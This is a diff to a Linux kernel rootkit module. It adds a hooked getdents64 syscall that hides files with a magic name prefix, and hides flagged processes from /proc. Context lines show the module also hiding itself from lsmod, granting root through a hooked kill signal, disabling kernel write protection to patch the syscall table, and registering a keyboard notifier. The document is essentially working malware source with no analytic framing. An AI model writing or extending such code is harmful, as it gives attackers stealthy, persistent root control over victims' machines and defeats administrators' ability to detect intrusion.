@@ -17,6 +17,9 @@
 #include <linux/kprobes.h>
 #include <linux/version.h>
 #include <linux/moduleparam.h>
+#include <linux/dirent.h>
+#include <linux/proc_ns.h>
+#include <linux/fdtable.h>
 #include "ctrll.h"
 
 MODULE_LICENSE("GPL");
@@ -35,6 +38,7 @@ static int ctrll_count = 0;
 static unsigned long cr0;
 static unsigned long *sys_call_table;
 static t_syscall normal_kill;
+static t_syscall normal_getdents64;
 
 // Hide from lsmod and rmmod. Keep pointer to previous module in the list so
 // that we know where to jump back in to unhide
@@ -169,6 +173,66 @@ void escalate(void) {
 	commit_creds(rootcreds);
 }
 
+int is_invisible(pid_t pid) {
+	struct task_struct *task;
+	if (!pid)
+		return 0;
+	task = lookup_task(pid);
+	if (!task)
+		return 0;
+	if (task->flags & 0x10000000)
+		return 1;
+	return 0;
+}
+
+static asmlinkage long ctrll_getdents64(const struct pt_regs *pt_regs) {
+	int fd = (int) pt_regs->di;
+    struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;	
+	int ret = normal_getdents64(pt_regs), err;
+	unsigned short proc = 0;
+	unsigned long off = 0;
+	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+	struct inode *d_inode;
+
+	if (ret <= 0)
+		return ret;
+
+	kdirent = kzalloc(ret, GFP_KERNEL);
+	if (kdirent == NULL)
+		return ret;
+
+	err = copy_from_user(kdirent, dirent, ret);
+	if (err)
+		goto out;
+
+	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
+		proc = 1;
+
+	while (off < ret) {
+		dir = (void *)kdirent + off;
+		if ((!proc &&
+		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
+		|| (proc &&
+		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+			if (dir == kdirent) {
+				ret -= dir->d_reclen;
+				memmove(dir, (void *)dir + dir->d_reclen, ret);
+				continue;
+			}
+			prev->d_reclen += dir->d_reclen;
+		} else
+			prev = dir;
+		off += dir->d_reclen;
+	}
+	err = copy_to_user(dirent, kdirent, ret);
+	if (err)
+		goto out;
+out:
+	kfree(kdirent);
+	return ret;
+}
+
 asmlinkage int ctrll_kill(const struct pt_regs *pt_regs) {
     int sig = (int) pt_regs->si;
     pid_t pid = (pid_t) pt_regs->di;
@@ -182,11 +246,11 @@ asmlinkage int ctrll_kill(const struct pt_regs *pt_regs) {
 			escalate();
 			break;
 		case 63:
+			if ((task = lookup_task(pid)) == NULL)
+				return -ESRCH;
 			if (debug) {
 				printk(KERN_INFO "ctrl-L: Hiding PID %d", pid);
 			}
-			if ((task = lookup_task(pid)) == NULL)
-				return -ESRCH;
 			task->flags ^= 0x10000000;
 			break;
 		default:
@@ -212,10 +276,13 @@ static int __init ctrll_rootkit_init(void) {
 	}
 
 	normal_kill = (t_syscall)sys_call_table[__NR_kill];
+	normal_getdents64 = (t_syscall)sys_call_table[__NR_getdents64];
+
 
 	cr0 = read_cr0();
 	change_cr0(cr0 & ~0x00010000);
 	sys_call_table[__NR_kill] = (unsigned long) ctrll_kill;
+	sys_call_table[__NR_getdents64] = (unsigned long) ctrll_getdents64;
 	change_cr0(cr0);
     register_keyboard_notifier(&kb_blk);
     
@@ -238,6 +305,7 @@ static void __exit ctrll_rootkit_exit(void) {
 
 	change_cr0(cr0 & ~0x00010000);
 	sys_call_table[__NR_kill] = (unsigned long) normal_kill;
+	sys_call_table[__NR_getdents64] = (unsigned long) normal_getdents64;
 	change_cr0(cr0);
 }
 
